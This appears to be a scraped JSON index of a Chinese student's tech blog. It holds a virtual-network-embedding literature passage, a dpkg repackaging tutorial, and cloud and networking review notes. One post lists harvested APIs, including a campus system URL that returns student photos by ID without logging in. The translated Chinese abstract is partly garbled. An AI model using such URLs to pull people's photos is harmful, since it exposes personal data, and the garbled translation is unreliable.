simulation system, it cannot reflect the genuine network environments.The power consumption that is consumed by data centers can be decomposed of three parts: the first part is the communication energy consumption that is consumed by substrate links, the second part is theserver energy consumption that is consumed by substrate nodes, and the third part is the other energy consumption that caused by cooling and power distribution systems. In the literature of [1], the authorsformulated a power-efficient VN provisioning issue into a mixed integer linear programming problem to address the first two parts of energy consumption problems. The contributions of this paper is to give therefinement of communication energy consumption by means of modeling the substrate links as wavelength-division multiplexing (WDM) network which is much closer to the genuine network environments,and employed an improved differentiated pricing strategy for choosing the routing paths. The proposed framework achieved a better tradeoff between the energy consumption and the blocking ratio of virtualnetwork requests. However, the disadvantage of this paper is that the proposed algorithm is based on two steps which cannot coordinate the two mapping stages, the main improvements lies in the improved dif-ferentiated pricing strategy in the link mapping stage while ignoring the enhancement of node mapping algorithm for facilitating the subsequent link mapping, and it can be further improved and intensified.The author of [4] proposed a memetic multi-objective energy aware virtual network embedding algorithm, in this paper, the author formulated an energy-aware virtual network embedding model and devised some of metrics for evaluating the embedding algorithms. This paper proposed a multi-objective particle swarm optimization algorithm to do a tradeoff among all of the optimization objectives, used the local search technique to accelerate the convergence of the proposed algorithm. Extensive simulations shown that the proposed algorithm outperforms the other existing algorithms in terms of increasing revenue and decreasing energy consumption. Nevertheless, the suggested algorithm does not consider the communication energy consumption that is consumed by substrate links.The main differences between the work [1] and our work are summarized as follows. The first difference is that our proposed algorithm takes into consideration of both energy consumption and load balance. The second difference is that our method improved the differentiated pricing strategy with an aim to avoid link bandwidth resource bottleneck issue. The third difference is that our method adopts the genuine model to formulate the substrate link energy consumption. p2.2-load balance aware VNE algorithmsThe load balance issue is an important aspect of virtual network embedding problems apart from the issues of revenue and energy consumption. The unbalanced workload in the substrate network can lead to the decreasing quality of services and quality of user experience (QoE) which does not guarantee that the offered services comply with the prescribed service level agreements (SLAs). In this section, wesummarize the load balance aware virtual network embedding approaches.Li et al. [17] suggested a virtual network embedding algorithm from the perspective of load balance with diverse virtual network requests. In their studies, they computed the node link resource ratio and link node resource ratio of substrate network using the available resource on substrate nodes and substrate links, and computed the node link resource ratio and link node resource ratio of virtual networks using the demand requirements of virtual nodes and virtual links. In the node mapping stage, they choose substrate node with the node link resource ratio is closest to the node link resource ratio of virtual node. In the link mapping stage, they choose substrate link with the link node resource ratio is closest to the link node resource ratio of virtual link. Extensive simulation demonstrated that the proposed algorithm can achieve higher acceptance ratio, revenue, and the state of load balancing.The authors of [18] presented an energy-aware virtual network embedding heuristic algorithm in their studies. They used a balancing factor to tradeoff between CPU resource of nodes and bandwidth resource of adjacent links for measuring the node importance. The proposed algorithm is based on the principle of energy consumption optimization and coordination between node mapping and link mapping, a comprehensive node ranking method is presented with the purpose of reducing the energy consumption and increasing the acceptance ratio.Aim at achieving the simultaneous load balancing of the substrate node and the substrate link, Huang [19] formulated a mathematical model of virtual network embedding problem which constrained by the number of hops, and proposed a multi-objective particle swarm optimization algorithm called LB-PSO to solve it, the proposed algorithm has significantly increased the acceptance ratio and resource utilization.In the study of [20], the authors formulated an integer linear programming model for the fragmentation-aware virtual network embedding problem for the first time, and carried out some simulations in three different scenarios to indicate that their algorithm outperforms the other existing algorithms. p3-system model and problem statement公式整理待更新 p4-the proposed algorithmp5-evaluation resultsp6-conclusion物理网络资源（指民用网络）的能耗 由于网络用户急速增长的原因而大幅增加。另外它还会导致不平衡的基础网络的负载的超重部分，并减少（virtual network embedding system)的性能。所以，研究将能耗和负载均衡纳入虚拟化网络嵌入过程对多目标具有重要意义虚拟网络嵌入算法。在本文中，我们首先研究了节点能量的影响节点排名计算中的sumption和节点资源利用率灰。然后我们提出了一种全面的节点排序方法CNRM在节点期间测量衬底节点的嵌入电位映射过程。此外，我们改善了差异化定价为了选择的目的加权衬底链接的策略基板路径，每个链路能耗最小虚拟链接。仿真结果表明我们的方法可以降低能耗，改善子负载平衡战略网络，同时略微恶化长期平均转速enue，接受率和收入与成本比率。由于不同的网络拓扑结构有所不同因此，我们将需要不同的映射方法专注于不同的虚拟网络嵌入算法我们未来工作中的各种网络拓扑。在我们的工作中，我们主要是专注于启发式虚拟网络嵌入算法，而确切的VNE算法超出了我们的研究工作。我们打算在未来的工作中做这项工作。","categories":[{"name":"翻译","slug":"翻译","permalink":"http://waynamigo.github.io/categories/翻译/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"}]},{"title":"解决软件源更新，旧版本软件应用无法使用的问题","slug":"2019-01-17-网易云音乐修改deb依赖","date":"2019-01-16T16:00:00.000Z","updated":"2019-07-14T10:12:18.585Z","comments":true,"path":"2019/01/17/2019-01-17-网易云音乐修改deb依赖/","link":"","permalink":"http://waynamigo.github.io/2019/01/17/2019-01-17-网易云音乐修改deb依赖/","excerpt":"简单的修改官方deb依赖的操作例子，以修改网易云音乐debian包为例","text":"简单的修改官方deb依赖的操作例子，以修改网易云音乐debian包为例 查看软件包里的文件内容(不必要，只是避免好久不用忘了参数1dpkg -c neteasemusic.deb 用dpkg解压1将软件包中的文件释放到extracted目录下 1dpkg-deb -x neteasemusic.deb extracted/ 解压deb包中DEBIAN目录下的文件1将主控信息解压，control中包括了所有依赖 dpkg创建包的时候，依赖的控制信息在DEBIAN文件夹中，所以首先要创建一个DEBIAN文件夹（大写 否则会出现错误 1dpkg-deb: error: failed to open package info file 'build//DEBIAN/control' for reading: No such file or directory 1dpkg-deb -e neteasemusic.deb extracted/DEBIAN 创建debian软件包1dpkg-deb -b extract/ ./ 参数如下123456789* -c：显示软件包中的文件列表；* -e：将主控信息解压；* -f：把字段内容打印到标准输出；* -x：将软件包中的文件释放到指定目录下；* -X：将软件包中的文件释放到指定目录下，并显示释放文件的详细过程；* -w：显示软件包的信息；* -l：显示软件包的详细信息；* -R：提取控制信息和存档的清单文件；* -b：创建debian软件包。","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"debian","slug":"debian","permalink":"http://waynamigo.github.io/tags/debian/"},{"name":"dpkg","slug":"dpkg","permalink":"http://waynamigo.github.io/tags/dpkg/"}]},{"title":"云计算复习","slug":"2019-01-08-云计算","date":"2019-01-07T16:00:00.000Z","updated":"2019-07-14T12:18:19.308Z","comments":true,"path":"2019/01/08/2019-01-08-云计算/","link":"","permalink":"http://waynamigo.github.io/2019/01/08/2019-01-08-云计算/","excerpt":"云计算概论","text":"云计算概论 绪论12* 云计算的定义* 云计算的人群 云计算的特征1234567超大规模高可扩展性虚拟化高可靠性通用性廉价性灵活定制 云计算的优点 虚拟化技术 动态可扩展 按需部署 高灵活性 高可靠性 高性价比 优点 缺点 降低用户计算机的成本 要求持续的网络连接 改善性能 低带宽网络连接环境下不能很好地工作 降低IT基础设施投资 反应慢 减少维护问题 减少软件开支 即时的软件更新 计算能力的增长 功能有限制 无限的存储能力 增强的数据安全性 无法确保数据的安全性 改善操作系统的兼容性 改善文档格式的兼容性 不能保证数据不会丢失 简化团队协作 没有地点限制的数据获取 绿色计算思想的实现者 分类服务类型： 基础设施、平台、应用部署范围： 公有、私有、混合 并行计算、分布式计算、网格计算属于计算科学 云计算、效用计算属于计算模式、商业模式与网格计算的区别： 网格是共享资源、协同计算，是一种资源共享模型。 而云计算采用网络将集群资源连接在一起，单向提供给用户资源进行数据处理。 资源调度模式 ：云计算以数据为中心，采用集群存储管理资源；网格计算以计算为中心，资源分布在各地。云计算进一步将硬件虚拟化。云计算体系结构IaaS、PaaS、SaaS infrastructure asa service： 硬件 资源 platform asa service： 软件环境 software asa service：应用程序 云存储结构 GFS (Google File System) HDFS(Hadoop Distributed File System) 存储层 基础管理层 应用接口层 访问层云计算技术体系结构 物理资源层：计算机、存储器、网络设施、数据库、软件 资源池层：将大量相同类型的资源构成资源池 管理中间件层： 资源管理、任务管理、用户管理、安全管理 SOA(Service-Oriented Architecture）构建层：将云计算能力封装成标准的Web Services 云计算的两条底层技术路线 分布式计算：把一个任务分解成多个小人物，在不同的服务器进行计算，整合计算资源 虚拟化：提供Iaas虚机，分割计算资源 VMM的分类 VMM(virtual machine monitor)虚拟化核心软件管理虚拟环境、管理物理资源 所谓虚拟化，是指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机 123虚拟化就是由位于下层的软件模块,通过向上一层软件模块提供一个与它原先所期待的运行环境 完全一致 的接口的方法,抽象出一个虚拟的软件或硬件接口,使得上层软件可以直接运行在虚拟环境上。 虚拟化的优点:封装(逻辑化)\\多实例–计算资源的充分利用率、绿色节能、降低成本\\隔离\\硬件兼容\\虚拟化层特权 虚拟化的缺点:性能错误安全影响复杂：虚拟化层的引入增加了系统出错层面(如有些驱动无法加载) 虚拟平台：完全虚拟化 半虚拟化 实现结构 ：Hypervisor模型宿主模型混合模型 IO虚拟化 发现虚拟设备 虚机加载驱动，通过vmm提供的后端接口驱动设备 后端驱动程序调用物理驱动程序管理物理IO设备 设备模型指VMM中进行设备模拟,并处理所有设备请求和响应的逻辑模块 ssh原理 客户端向服务器端发出连接请求 服务器端向客户端发出自己的公钥 客户端使用服务器端的公钥加密通讯密钥然后发给服务器端 如果通讯过程被截获,由于窃听者即使获知公钥和经过公钥加密的内容,但不拥有私钥依然无法解密(RSA算法) 服务器端接收到密文后,用私钥解密,获知通讯密钥 ssh-keygen命令给服务器端产生公私钥密钥对 Hadoop HDFS NameNode DataNode 事务日志 映像文件 SecondaryNameNode 读取数据流程 12345客户端要访问HDFS中的一个文件首先从namenode获得组成这个文件的数据块位置列表根据列表知道存储数据块的datanode访问datanode获取数据Namenode并不参与数据实际传输 冗余副本策略,所有数据块都有副本 心跳机制，保证数据一致性 机架策略 Hbase HBase是一个分布式的、面向列的开源数据库 适合于非结构化数据存储的数据库 行键是数据行在表里的唯一标识 123* 以表的形式存放数据* 表由行与列组成,每个列属于某个列族,由行和列确定的存储单元称为元素* 每个元素保存了同一份数据的多个版本,由时间戳来标识区分 列表示为&lt;列族&gt;:&lt;限定符&gt; Hbase在磁盘上按照列族存储数据,这种列式数据库的设计非常适合于数据分析 列族里的元素最好具有相同的读写方式(例如等长的字符串),以提高性能，可压缩 docker 把Linux的cgroup、namespace,chroot等容器底层技术进行封装抽象,为用户提供了创建和管理容器的便捷界面","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"Cloud Computing","slug":"Cloud-Computing","permalink":"http://waynamigo.github.io/tags/Cloud-Computing/"}]},{"title":"网络原理应用层复习","slug":"2019-01-07-应用层","date":"2019-01-06T16:00:00.000Z","updated":"2019-07-14T10:11:27.120Z","comments":true,"path":"2019/01/07/2019-01-07-应用层/","link":"","permalink":"http://waynamigo.github.io/2019/01/07/2019-01-07-应用层/","excerpt":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测","text":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测 域名系统 DNS 文件传送协议 远程终端协议 TELNET 万维网 WWW 电子邮件 动态主机配置协议 DHCP P2P 应用 #总结 国家顶级域名 nTLD 通用顶级域名 gTLD 基础结构域名 (infrastructure domain)，顶级域名只有一个,即 arpa 一个服务器所负责管辖的(或有权限的)范围叫区 (zone)。 每一个区设置相应的权限域名服务器,用来保存该区中的所有主机的域名到 IP 地址的映射。根域名服务器共有 13 套装置,不是 13 个机器 可靠性：DNS 域名服务器都把数据复制到几个域名服务器来保存,其中的一个是主域名服务器,其他的是辅助域名服务器域名服务器 根域名服务器 最高层次的域名服务器,也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和 IP 地址a.rootservers.netb.rootservers.net 顶级域名服务器 权限域名服务器 本地域名服务器域名的解析过程 主机向本地域名服务器的查询一般都是采用递归查询 本地域名服务器向根域名服务器的查询通常是采用迭代查询。高速缓存 每个域名服务器都维护一个高速缓存* ,存放最近用过的名字以及从何处获得名字映射信息的记录 文件传输 文件传送协议 FTP (File Transfer Protocol) 提供交互式的访问工作步骤 打开熟知端口(端口号为 21),使客户进程能够连接上。 等待客户进程发出连接请求。 启动从属进程来处理客户进程发来的请求。 回到等待状态,继续接受其他客户进程发来的请求。控制连接和数据连接控制连接在整个会话期间一直保持打开，实际用于传输文件的是“数据连接”超媒体超文本","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网络原理运输层复习","slug":"2019-01-06-传输层","date":"2019-01-05T16:00:00.000Z","updated":"2019-07-14T12:18:02.939Z","comments":true,"path":"2019/01/06/2019-01-06-传输层/","link":"","permalink":"http://waynamigo.github.io/2019/01/06/2019-01-06-传输层/","excerpt":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测","text":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测 用户数据报协议 UDP 传输控制协议 TCP 可靠传输的工作原理 TCP 报文段的首部格式 TCP 的流量控制、拥塞控制 TCP 的运输连接管理 TCP UDP 传输的数据单位：运输协议数据单元 TPDU (Transport Protocol Data Unit) 用户数据报协议UDP (User Datagram Protocol) 无连接 ├── 在传送数据之前不需要先建立连接 ├── 对方的运输层在收到 UDP 报文后,不需要给出任何确认。 └── 不提供可靠交付与IP数据报的区别：IP需要经过存储转发过程、UDP在运输层的端到端（进程）的逻辑信道中传送，只比IP数据报服务多了 复用分用 差错检测特点 UDP 是无连接的,发送数据之前不需要建立连接,因此减少了开销和发送数据之前的时延 UDP 使用尽最大努力交付,即不保证可靠交付 UDP 是面向报文的,UDP 一次交付一个完整的报文。 UDP 没有拥塞控制 UDP 支持一对一、一对多、多对一和多对多的交互通信,全双工 UDP 的首部开销小,只有 8 个字节,比TCP 的 20 个字节的首部要短。 传输控制协议 TCP (Transmission Control Protocol) 面向连接的运输层协议 TCP 连接只能有两个端点 提供可靠交付 提供全双工通信 面向字节流特点根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节(UDP 发送的报文长度是应用进程给出的) 可靠传输 停止等待协议 连续ARQ协议 123456789发送方维持的发送窗口,它的意义是:位于发送窗口内的分组都可连续发送出去,而不需要等待对方的确认。这样,信道利用率就提高了。连续 ARQ 协议规定,发送方每收到一个确认,就把发送窗口向前滑动一个分组的位置。接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认,而是对按序到达的最后一个分组发送确认,这样就表示:到这个分组为止的所有分组都已正确收到了。 确认丢失不必重传 不能向发送方反映出接收方已经正确收到的所有分组的信息 GBN重传 可以在连续收到好几个正确的确认帧后，才对最后一个数据帧发确认信息 这就是说，对某一数据帧的确认就表明该数据帧和这以前所有的数据帧均已正确无误地收到了。 后退N帧协议的接受窗口为1，可以保证按序接受数据帧。若采用n个比特对帧编号，则其发送窗口的尺寸Wt应满足：1&lt;=Wt&lt;=2^n-1 ACK(n+1)表示对第n号帧的确认，表明接受方已正确收到第n帧及以前的所有帧 例题：数据链路层采用了后退N帧(GBN)协议，发送方已经发送了编号为0～7的帧。当计时器超时时，若发送方只收到0、2、3号帧的确认，则发送方需要重发的帧数是( )。 1解析：根据后退N帧协议，接收方的窗口为“1”，如果发送方收到了3号帧的确认，则说明0、1、2、3号帧都已经发送成功，所以只需要重发4、5、6、7号帧即可。 TCP可靠重传 字节为单位的滑动窗口 1234567891011121314151617181920发送缓存：存放①发送应用程序传送给发送方 TCP 准备发送的数据 ②TCP 已发送出但尚未收到确认的数据* 超时重传时间* 选择确认SACK## TCP流量控制出现拥塞的原因:∑对资源需求 &gt; 可用资源* 增加资源不能解决拥塞，重传也不行，反而可能加剧* 拥塞控制：为了防止过多数据注入到网络中，一个全局性的过程* 流量控制：点对通信量的控制，一个端到端的过程，抑制发送端发送数据的速率,以便使接收端来得及接收开环控制、闭环控制。### tcp拥塞控制方法（闭环控制TCP发送方维持一个拥塞窗口 CWND(Congestion Window)*判断方式 有两个：** 使用**重传定时器**定时，若超时，重传；* 收到三个重复的ACK算法有四种，慢开始，&lt;blue&gt;拥塞避免&lt;/blue&gt;、快重传、快恢复* 拥塞窗口 cwnd 设置：最大报文段 SMSS 窗口数值* 慢开始门限 ssthresh(状态变量):防止拥塞窗口cwnd 增长过大引起网络拥塞。 当 cwnd &lt; ssthresh 时,使用慢开始算法。当 cwnd &gt; ssthresh 时,停止使用慢开始算法而改用拥塞避免算法。当 cwnd = ssthresh 时,既可使用慢开始算法,也可使用拥塞避免算法。 * 3ACK 拥塞避免，变成一半，然后拥塞避免，线性增加 * 超时 cwnd=1，慢开始，从1开始增加 ### 快重传：让发送方尽早知道发生了个别报文段的丢失 发送方只要一连收到三个重复确认,就知道接 收方确实没有收到报文段,因而应当立即进行 重传(即“快重传”),这样就不会出现超时, 发送方也不就会误认为出现了网络拥塞 {% image /img/FN.png '' '' %} ## TCP三次握手 发送链接请求报文段 * A ---------------------------------------- B * A发请求报文段，同步位SYN=1，选择序号seq=x表示第一个数据字节的序号为x * B发确认报文段，同步位SYN=1，确认位ACK=1，确认号ack=x+1，自己的数据序号seq=y * A发确认报文段，确认位ACK=1，数据序号seq=x+1，确认号ack=y+1 发送链接释放报文段 * A ---------------------------------------- B * A发请求报文段，FIN=1，选择序号seq=u * B发确认报文段，ACK=1，确认号ack=u+1，数据序号seq=v，A半关闭 * B发确认报文段，FIN=1，ACK=1，确认号ack=u+1，数据序号seq=w * A发确认报文段，ACK=1，确认号ack=w+1，数据序号seq=u+1，A关闭 **其中，A 必须等待 2MSL 的时间** * 保证 A 发送的最后一个 ACK 报文段能够到达 B。 * A 在发送完最后一个 ACK 报文段后,再经过时间 2MSL,就可以使本连接持续的 时间内所产生的所有报文段,都从网络中消失。这样就可以使下一个新的连接中不会出现这种 旧的连接请求报文段。","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网络原理物理层链路层复习","slug":"2019-01-05-物理层链路层","date":"2019-01-04T16:00:00.000Z","updated":"2019-07-14T12:17:14.600Z","comments":true,"path":"2019/01/05/2019-01-05-物理层链路层/","link":"","permalink":"http://waynamigo.github.io/2019/01/05/2019-01-05-物理层链路层/","excerpt":"限于物理层、链路层","text":"限于物理层、链路层 物理层屏蔽双绞线 STP (Shielded Twisted Pair)无屏蔽双绞线 UTP (Unshielded Twisted Pair)1室内传送数据的无屏蔽双绞线和屏蔽双绞线的标准 EIA/TIA-568。 多模光纤12可以存在多条不同角度入射的光线在一条光纤中传输。这种光纤就称为多模光纤。 单模光纤12若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，它可使光线一直向前传播，而不会产生多次反射,这样的光纤称为单模光纤 优点123456(1) 通信容量非常大。(2) 传输损耗小，中继距离长。(2) 抗雷电和电磁干扰性能好。(3) 无串音干扰，保密性好。(4) 体积小，重量轻。TIPS:光纤应用于：**企业网络 FTTH 和访问网络 长途网络 水下网络** 自由空间称为“非导引型传输媒体”。短波通信（即高频通信）主要是靠【电离层】的反射，但短波信道的通信质量较差，传输速率低微波在空间主要是直线传播 传统微波：地面微波接力通信 、卫星通信 宽带接入技术：有线宽带接入 无线宽带接入 非对称数字用户线 ADSL (Asymmetric Digital Subscriber Line) 技术12345678910用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务特点：上行和下行带宽做成不对称的(上行指从用户到 ISP，而下行指从 ISP 到用户)。ADSL 在用户线（铜线）的两端各安装一个ADSL 调制解调器。我国目前采用的方案是离散多音调 DMT (Discrete Multi-Tone)调制技术。（这里的“多音调”就是【“多载波”或“多子信道”】的意思。DMT 调制技术采用【频分复用】的方法ADSL 采用【自适应调制技术】使用户线能够传送尽可能高的数据率，但【不能保证固定的数据率】第二代ADSL【无缝速率自适应技术 SRA (Seamless Rate Adaptation)】HFC网使用【模拟光纤技术】【电缆调制解调器】是为【 HFC 网】而使用的调制解调器 数据链路层链路层使用的信道 :点对点信道、广播信道链路&lt;通路 1234数据（逻辑）链路 (data link) 除了【物理线路】外，还必须有【通信协议】来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。一般的适配器都包括了【数据链路层和物理层】这两层的功能。 数据链路层协议要解决的基本问题【封装成帧】【透明传输】【差错控制】 ①封装成帧，在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。作用：确定帧的界限【帧定界】。—帧定界符SOH_DATA_EOT（end of transmission） ②透明传输：如果数据中的某个字节的二进制代码恰好和SOH或EOT一样数据链路层就会错误地“找到帧的边界” 123456解决方法：【字节填充 (byte stuffing)】或【字符填充(character stuffing)】。 1发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”(其十六进制编码是 1B)。2接收端的数据链路层在将数据送往网络层之前删除插入的转义字符3如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。当接收端收到连续的两个转义字符时，就删除其中前面的一个 ③差错检测：在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1在一段时间内，传输错误的比特占所传输比特总数的比率称为【误码率 BER (Bit Error Rate)】。 循环冗余检验CRC计算冗余码，余数作为FCS【帧检验序列】 CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。 FCS 可以用 CRC 这种方法得出，但 CRC 并不是获得 FCS 的唯一方法 “无比特差错”与“无传输差错”是不同的概念。 (1) 若得出的余数 R = 0，则判定这个帧没有差错，就接受 (accept)。 (2) 若余数 R！=0，则判定这个帧有差错，就丢弃。数据链路层的CRC检验可以实现【无比特差错】， 但是【不可靠传输】【不能确定是哪个比特出了差错】，只能做到【无差错接受】（无比特差错）要做到“可靠传输”（即发送什么就收到什么）就必须再加上【确认和重传机制】 PROTOCAL PPP(Point-to-Point Protocol)协议】点对点协议（包含了物理层和ip层的内容） 【面向字节，以字节为单位】 【一个将 IP 数据报封装到串行链路的方法】 【链路控制协议 LCP (Link Control Protocol)】 【网络控制协议 NCP (Network Control Protocol)】 【同步传输时，采用硬件完成【比特填充】，零比特传输：五个连续的1就填入一个0，接收时删除】 【异步传输时，使用特殊的字符填充法】MAC帧格式 PROTOCAL CSMA/CD局域网具有如下主要优点： 【具有广播功能】，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。 【便于系统的扩展和逐渐地演变】，各设备的位置可灵活调整和改变。 【提高了系统的可靠性、可用性、残存性】","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网络原理网络层复习","slug":"2019-01-05-网络层复习","date":"2019-01-04T16:00:00.000Z","updated":"2019-07-14T12:17:38.265Z","comments":true,"path":"2019/01/05/2019-01-05-网络层复习/","link":"","permalink":"http://waynamigo.github.io/2019/01/05/2019-01-05-网络层复习/","excerpt":"限于IP层","text":"限于IP层 网络层向运输层提供的服务 面向连接 无连接IP协议123* 地址解析协议 ARP(Address Resolution Protocol)** * 网际控制报文协议 ICMP(Internet Control Message Protocol)*** 网际组管理协议 IGMP(Internet Group Management Protocol)** 互联时使用中间设备 物理层中继系统:转发器 (repeater)。 数据链路层中继系统:网桥 或 桥接器 (bridge)。 网络层中继系统:路由器 (router)。 网桥和路由器的混合物:桥路器 (brouter)。 网络层以上的中继系统:网关 (gateway)。IP地址分类 A B C三类*123456网络号|主机号 一共32位IPv6 128位IP 地址 ::= &#123; &lt;网络号&gt;, &lt;主机号&gt;&#125;A类地址 8 ，24 [最大可指派网络126 (2^7 -1 -1)]B类地址 16，16 [最大可指派网络(2^14 -1 -1)]C类地址 24, 8 [最大可指派网络(2^21 -1 -1)] IP地址与硬件地址报文、数据帧的区别 其他分类方式 子网划分 构成超网 ARP协议,解决同一个局域网的主机或路由器的IP：MAC问题 不管网络层使用的是什么协议,在实际网络的链路上传送数据帧时,最终还是必须使用硬件地址。 ARP 高速缓存 (ARPcache),里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。格式 &lt; IP address;MAC address;TTL &gt; TTL (Time To Live):地址映射有效时间 。 12345存放最近获得的 IP 地址到 MAC 地址的绑定,以减少 ARP 广播的数量。为了减少网络上的通信量,主机 A 在发送其ARP请求分组时,就将自己的 IP 地址到硬件地址的映射写入 ARP 请求分组。当主机 B 收到 A 的 ARP 请求分组时,就将主机 A的这一地址映射写入主机 B 自己的 ARP高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。 ARP请求分组包含发送方硬件地址 / 发送方IP 地址/目标方硬件地址(未知时填 0)/ 目标方IP 地址。 本地广播 ARP 请求 ARP 响应分组 包含发送方硬件地址/发送方IP地址/目标方硬件地址/目标方 IP 地址。 IP数据报分片数据报字段格式 转发过程：根据IP数据报的目的地址就可以确定下一跳路由器分组转发算法12345678910(1) 从数据报的首部提取目的主机的 IP 地址 D, 得出目的网络地址为 N。(2) 若网络 N 与此路由器直接相连,则把数据报直接交付目的主机D;否则是间接交付,执行(3)。(3) 若路由表中有目的地址为 D 的特定主机路由,则把数据报传送给路由表中所指明的下一跳路由器;否则,执行(4)。(4) 若路由表中有到达网络 N 的路由,则把数据报传送给路由表指明的下一跳路由器;否则,执行(5)。(5) 若路由表中有一个默认路由,则把数据报传送给路由表中所指明的默认路由器;否则,执行(6)。(6) 报告转发分组出错。 划分子网从 主机号借用几位 划分子网号 IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}与上述转发过程不同点：121)路由器在收到 IP 数据报后,再按目的网络号 net-id 和子网号 subnet-id 找到目的子网2)通过子网掩码与IP地址进行&amp;操作，匹配，则说明子网掩码代表的这个子网就是目的网络。 CIDR 无分类编址 CIDR，IP地址 ::= {&lt;网络前缀&gt;, &lt;主机号&gt;},中间使用符号‘/’来表示网络前缀构成超网路由聚合 有利于减少路由器之间选择的次数，从而提高性能。 CIDR记法 0 可以省略 最长前缀匹配原因：使用 CIDR 时,路由表中的每个项目由“网络前缀”和“下一跳地址”组成。在查找路由表时可能会得到不止一个匹配结果方案：在匹配结果中选择最长网络前缀的路由。 ICMP 报文格式 ICMP首部检验和 路由选择协议 内部网关协议 RIP ———| 内部网关协议 OSPF ———|–IGP 外部网关协议 BGP 将路由选择协议传递到另一个自制系统中使用4种报文打开 更新 保活 keepalive 通知 notification RIP(1)仅和相邻路由器交换信息。(2)交换的信息是当前本路由器所知道的全部信息,即自己的路由表。(3)按固定的时间间隔交换路由信息,例如,每隔30秒。当网络拓扑发生变化时,路由器也及时向相邻路由器通告拓扑变化后的路由信息。 隧道技术 在 IPv6 数据报要进入IPv4网络时,把 IPv6 数据报封装成为 IPv4 数据报,整个的 IPv6 数据报变成了 IPv4 数据报的数据部分。 当 IPv4 数据报离开 IPv4 网络中的隧道时,再把数据部分(即原来的 IPv6 数据报)交给主机的 IPv6 协议栈。 NAT技术 网络地址转换(Network Address Translation)解决：在专用网上使用专用地址的主机如何与互联网上的主机通信(并不需要加密)的问题 123456789内部主机 A 用本地地址 IP A 和互联网上主机 B 通信所发送的数据报必须经过 NAT 路由器。NAT 路由器将数据报的源地址 IP A 转换成全球地址IP G ,并把转换结果记录到NAT地址转换表中,目的地址 IP B 保持不变,然后发送到互联网。NAT 路由器收到主机 B 发回的数据报时,知道数据报中的源地址是 IP B 而目的地址是 IP G 。根据 NAT 转换表,NAT 路由器将目的地址 IP G 转换为IP A ,转发给最终的内部主机 A。","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网上的API","slug":"2018-12-19-bilibili汗其他的一些API","date":"2018-12-18T16:00:00.000Z","updated":"2019-07-14T10:10:20.471Z","comments":true,"path":"2018/12/19/2018-12-19-bilibili汗其他的一些API/","link":"","permalink":"http://waynamigo.github.io/2018/12/19/2018-12-19-bilibili汗其他的一些API/","excerpt":"持续更新","text":"持续更新 抓包和浏览器(CTRL C)搞到的一些API APIset抓包和浏览器(CTRL C)搞到的一些API 教务系统API不需要用沙雕IE登沙雕教务系统搞照片了（格式*/pic/学号.JPG 1http://211.87.177.1/jwxt/uploadfile/studentphoto/pic/ 网易云音乐1https://music.163.com/outchain/player?type=2&amp;id=28563201&amp;auto=1&amp;height=66&amp;bg=e8e8e8 bilibili抓数据的API（json弹幕APICID_DANMAKU.format(cid)1CID_DANMAKU = 'http://comment.bilibili.com/&#123;0&#125;.xml' CID_DANMAKU_HIS.format(cid)1CID_DANMAKU_HIS = 'http://comment.bilibili.com/rolldate,&#123;0&#125;' CID_HISDANMAKU.format(timestamp, cid)1CID_HISDANMAKU = 'http://comment.bilibili.com/dmroll,&#123;0&#125;,&#123;1&#125;' 动态DYNAMICAPI动态的detail，具体自己打开浏览器见json1DynamicAPI = 'https://api.vc.bilibili.com/dynamic_svr/v1/dynamic_svr/get_dynamic_detail?dynamic_id=' + Dynamic_id param offset1'https://api.live.bilibili.com/dynamic_repost/v1/dynamic_repost/view_repost?dynamic_id='+ Dynamic_id + '&amp;offset='+ each_count 私聊API（你甚至可以1'https://message.bilibili.com/#/whisper/mid'+uid 